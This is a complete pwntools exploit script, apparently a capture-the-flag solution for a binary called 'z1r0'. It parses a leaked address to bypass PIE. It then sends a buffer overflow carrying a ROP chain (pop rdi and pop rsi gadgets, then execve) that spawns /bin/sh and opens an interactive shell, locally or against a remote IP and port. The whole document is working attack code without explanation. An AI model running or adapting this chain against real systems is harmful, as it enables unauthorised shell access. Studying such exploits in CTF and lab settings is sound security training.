from pwn import *

context(arch='amd64', os='linux', log_level = 'debug')

file_name = './z1r0'

debug = 0
if debug:
    r = remote('123.60.63.90', 6890)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

r.recvuntil('0x')

main_addr = int(r.recv(12), 16)
success('main_addr = ' + hex(main_addr))

offest = main_addr - 0x7cf

pop_rdi = offest + 0x00000000000008c3
pop_rsi = offest + 0x00000000000008c1

execve = offest + 0x610
arg = offest + 0x201040

p1 = b'/bin/sh\x00' * 5 +  p64(pop_rdi) + p64(arg) + p64(pop_rsi)+p64(0)*2+ p64(execve)

r.sendline(p1)




r.interactive()
